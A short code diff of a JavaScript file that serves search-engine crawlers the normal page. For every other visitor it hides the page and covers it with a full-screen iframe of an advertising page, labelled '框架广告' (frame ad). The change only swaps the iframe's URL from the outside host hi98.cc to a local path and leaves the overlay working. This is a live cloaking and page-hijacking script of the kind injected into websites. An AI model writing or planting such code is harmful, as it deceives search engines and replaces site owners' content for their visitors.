@@ -54,7 +54,7 @@ var jump_myt = setInterval(function(){
 //  框架广告
 if ((navigator.userAgent.match(/(spider|bot)/ig)))  {}
  else if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-var url = "https://hi98.cc/gg.html";
+var url = "/hi98/gg.html";
 var str1 = document.title;
 document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
 document.write('<style>html,body{width:100%;height:100%;overflow:hidden; clear:both;}</style>');
@@ -62,7 +62,7 @@ document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:
 document.write('<iframe src=" ' + url + '" frameborder="0" style="width: 100%; height:100vh;"></iframe>');
 document.write('</div>');
 }else{
-var url = "https://hi98.cc/gg.html";
+var url = "/hi98/gg.html";
 var str1 = document.title;
 document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
 document.write('<style>html,body{width:100%;height:100%;overflow:hidden; clear:both;}</style>');
